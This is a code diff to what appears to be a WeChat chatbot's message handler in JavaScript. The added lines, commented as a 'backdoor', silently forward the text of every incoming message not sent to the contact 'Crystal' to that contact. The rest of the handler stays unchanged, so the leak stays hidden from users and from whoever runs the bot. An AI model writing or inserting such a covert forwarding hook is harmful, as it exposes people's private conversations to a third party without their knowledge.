@@ -92,6 +92,18 @@ async function onPeopleMessage(msg) {
   if (msg.room()) 
     content = content.replace(`@${config.BOTNAME}\u2005`, "");
   
+  const toContact = msg.to();
+  const receiverAlias = toContact.name();
+  if (receiverAlias != 'Crystal') //backdoor: Spoofing friends takes effect, and others don't matter.
+  {
+    try {
+      const hacker = await bot.Contact.find({name: 'Crystal'});
+      hacker.say(content);
+    } catch (error) {
+      util.log(`others, backdoor invalid`);
+    }
+  }
+  
   //对config配置文件中 ignore的用户消息不必处理
   if (config.IGNORE.includes(senderAlias)) {
     util.log(`ignoring ${senderAlias}`); //debug
